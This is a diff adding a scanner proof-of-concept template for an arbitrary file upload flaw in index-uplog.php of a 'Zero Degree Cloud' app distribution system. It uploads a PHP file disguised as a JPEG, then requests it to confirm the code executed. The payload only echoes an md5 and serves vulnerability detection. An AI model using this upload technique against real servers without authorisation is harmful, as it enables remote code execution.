@@ -1,0 +1,55 @@
+id: poc-yaml-zero-degree-cloud-index-uplog-php-anyfile-upload
+info:
+  name: Zero Degree Cloud APP Distribution Signature System index-uplog.php Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: arbitrary-file-upload
+
+variables:
+  t1: "{{rand_int(10,100)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/source/pack/upload/2upload/index-uplog.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpWhy"
+    body: |-
+      ------WebKitFormBoundary03rNBzFMIytvpWhy
+      Content-Disposition: form-data; name="time"
+
+      {{t1}}-{{t1}}
+      ------WebKitFormBoundary03rNBzFMIytvpWhy
+      Content-Disposition: form-data; name="app"; filename="1.php"
+      Content-Type: image/jpeg
+
+      <?php echo md5({{t1}});?>
+      ------WebKitFormBoundary03rNBzFMIytvpWhy--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "'extension':'php'"
+        part: body
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/source/data/tmp/{{t1}}-{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
